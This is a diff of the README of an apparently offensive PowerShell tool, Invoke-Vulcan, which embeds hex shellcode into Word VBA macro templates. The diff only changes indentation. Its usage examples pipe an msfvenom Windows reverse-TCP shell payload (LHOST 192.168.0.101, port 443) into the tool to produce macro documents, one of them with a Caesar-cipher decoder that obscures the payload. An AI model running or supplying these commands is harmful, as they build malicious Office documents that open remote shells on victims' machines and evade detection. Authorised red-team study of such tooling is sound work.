@@ -53,11 +53,11 @@ Users/stargazers are greatly encouraged toward contributing to improving and ext
 `Get-Help -Name Invoke-Vulcan` is your friend... Your best friend is `Get-Help -Name Invoke-Vulcan -Detailed`. Nonetheless, `Invoke-Vulcan` must be fed a `hex`-formatted shellcode. This can be achieved with:
 
 ```powershell
-    Get-Content -Path $ShellCode -AsByteStream -Raw | Invoke-Vulcan ...
+Get-Content -Path $ShellCode -AsByteStream -Raw | Invoke-Vulcan ...
 ```
 
 ```powershell
-    wsl --exec msfvenom ... -f hex | Invoke-Vulcan ...
+wsl --exec msfvenom ... -f hex | Invoke-Vulcan ...
 ```
 
 ### Examples
@@ -66,7 +66,7 @@ Users/stargazers are greatly encouraged toward contributing to improving and ext
 
     ```powershell
     wsl --exec msfvenom -p windows/shell/reverse_tcp LHOST=192.168.0.101 LPORT=443 EXITFUNC=thread -f hex | 
-            Invoke-Vulcan -OutputDirectory ".\winwords\" -Template ".\assets\templates\indirect.vba"
+        Invoke-Vulcan -OutputDirectory ".\winwords\" -Template ".\assets\templates\indirect.vba"
     ```
 
 > Although obvious, `windows/shell/reverse_tcp LHOST=192.168.0.101 LPORT=443 EXITFUNC=thread` is a placeholder for your own values... 🙄
@@ -75,7 +75,7 @@ Users/stargazers are greatly encouraged toward contributing to improving and ext
 
     ```powershell
     wsl --exec msfvenom -p windows/shell/reverse_tcp LHOST=192.168.0.101 LPORT=443 EXITFUNC=thread -f hex | 
-            Invoke-Vulcan -OutputDirectory ".\winwords\" -Template ".\assets\templates\indirect.vba" -Decoder Caesar -DecoderPath ".\assets\decoders\caesar.vba" -CaesarShift 5
+        Invoke-Vulcan -OutputDirectory ".\winwords\" -Template ".\assets\templates\indirect.vba" -Decoder Caesar -DecoderPath ".\assets\decoders\caesar.vba" -CaesarShift 5
     ```
 
 > Although obvious, `windows/shell/reverse_tcp LHOST=192.168.0.101 LPORT=443 EXITFUNC=thread` is a placeholder for your own values... 🙄
